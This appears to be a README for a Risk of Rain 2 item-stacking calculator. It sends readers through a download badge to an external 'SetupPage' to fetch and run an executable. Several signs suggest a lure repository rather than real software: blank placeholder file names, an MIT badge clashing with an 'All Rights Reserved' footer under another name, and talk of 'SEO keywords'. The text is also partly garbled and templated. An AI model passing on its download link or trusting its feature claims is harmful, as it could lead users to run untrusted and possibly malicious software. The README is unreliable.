# RiskOfRain2 Item Stacking Calculator

<p align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-0f766e?style=flat-square&logo=python&logoColor=white" alt="Download">
  </a>
  <img src="https://img.shields.io/badge/License-MIT-2b8c2e?style=for-the-badge&logo=github" alt="License">
  <img src="https://img.shields.io/badge/Version-1.0.0-ff69b4?style=plastic&logo=appveyor" alt="Version">
  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-6c757d?style=flat&logo=windows" alt="Platform">
  <img src="https://img.shields.io/badge/Language-Python-3776AB?style=flat-square&logo=python" alt="Language">
</p>

---

## What the Calculator Does

RiskOfRain2 Item Stacking Calculator converts the raw item counts you collect in‑game into the exact statistical bonuses that the engine applies. It parses the official item table, respects the exponential scaling rules for items such as **Harvester's Scythe** or **Paul's Goat Hoof**, and then presents the results in a tidy spreadsheet‑ready format. The primary goal is to let players verify whether a particular loadout is truly optimal for a given run length, without manually consulting the wiki for each tier.

---

## Core Features

- **Profile‑Driven Configuration** – Switch between ``, ``, ``, and `` without editing source files. Each profile stores a distinct set of item selections, difficulty level, and stage progression.
- **Workflow Presets** – Pre‑built presets for “Early‑Game”, “Mid‑Game” and “Late‑Game” scenarios automatically populate the calculator with common item combinations.
- **Batch Export** – Generate CSV or JSON bundles for the entire run in a single click, ready for import into spreadsheets or external analytics pipelines.
- **Live Recalculation** – Adjust a single item count and watch all dependent values update instantly; no need to rerun the whole script.
- **Cross‑Platform Compatibility** – Tested on Windows 10/11 and Ubuntu 22.04; the same configuration files work identically on both OSes.

---

## Getting Started

1. **Download the latest release** using the badge above. The archive contains the executable, the `configs/` folder, and a short README for local troubleshooting.
2. Extract the archive to a directory of your choice. The folder structure is described in the next section.
3. Open `Release` (or run `python main.py` if you prefer the source).
4. Choose a configuration profile from the drop‑down menu or load a custom preset you have saved previously.
5. Input the number of each item you own, then press **Calculate**. The results appear in the table below the input fields.

---

## Directory Layout

```
RiskOfRain2-Item-Stacking-Calculator/
├─ configs/
│  ├─
│  ├─
│  ├─
│  └─
├─ data/
│  └─ item_table.json      # Master list of items and scaling formulas
├─ outputs/
│  ├─ last_run.csv
│  └─ diagnostics.log
├─ docs/
│  └─ FAQ.md
├─ main.py                 # Entry point when running from source
└─ README.md               # This document
```

The `data/item_table.json` file is generated from the official Risk of Rain 2 API and updated with each new game patch. The calculator reads this file at start‑up; you do not need to modify it unless you are experimenting with custom items.

---

## Frequently Asked Questions

**Q: The calculator returns “NaN” for a particular item.**
A: This usually indicates that the item’s scaling rule is missing from `item_table.json`. Verify that the JSON entry contains `base`, `increment`, and `cap` fields. If you edited the file manually, restore the original version from the `data/` backup folder.

**Q: My custom profile does not appear in the drop‑down menu.**
A: Profiles are loaded only from the `configs/` directory and must have the `.cfg` extension. Ensure the file is saved with that extension and that the application has read permission for the folder.

**Q: The CSV export includes empty columns.**
A: Empty columns correspond to items that were not part of the selected profile. You can hide them in the spreadsheet or edit `` to set `show_empty = false`.

**Q: I receive a “UnicodeDecodeError” on Linux.**
A: The default file encoding is UTF‑8. If you edited a config file with a different locale, re‑save it using UTF‑8 encoding (e.g., `iconv -f ISO-8859-1 -t UTF-8  > `).

---

## Contributing & Feedback

Contributions are encouraged, provided they respect the repository’s coding conventions (PEP 8, type hints, and comprehensive docstrings). To submit a change:

1. Fork the repository under your GitHub account.
2. Create a branch named `feature/<short‑description>`.
3. Ensure all new code passes the existing unit tests (`pytest`).
4. Open a pull request with a clear description of the change and any relevant screenshots.

Bug reports, feature requests, or performance observations can be posted in the **Issues** tab. Tag your post with one of the SEO keywords (`riskofrain2`, `item`, `stacking`, `calculator`, etc.) to improve discoverability.

---

*© 2026 TigerProxy78 – All Rights Reserved.*

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```